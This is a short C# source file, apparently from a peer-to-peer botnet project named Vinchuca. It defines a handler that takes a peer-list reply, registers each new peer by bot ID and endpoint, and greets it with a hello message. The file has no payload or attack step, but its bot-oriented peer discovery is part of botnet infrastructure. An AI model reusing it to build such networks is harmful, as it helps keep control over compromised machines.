using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca.Network.Protocol.Handlers
{
    public class GetPeerListReplyMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public GetPeerListReplyMessageHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage message)
        {
            var msg = message.Message as GetPeerListReplyMessage;

            foreach (var peer in msg.Peers)
            {
                if (_peerList.TryRegister(new PeerInfo(peer.BotId, peer.EndPoint)))
                {
                    var hello = new HelloMessage();
                    _messageManager.Send(hello, peer.BotId);
                }
            }
        }
    }
}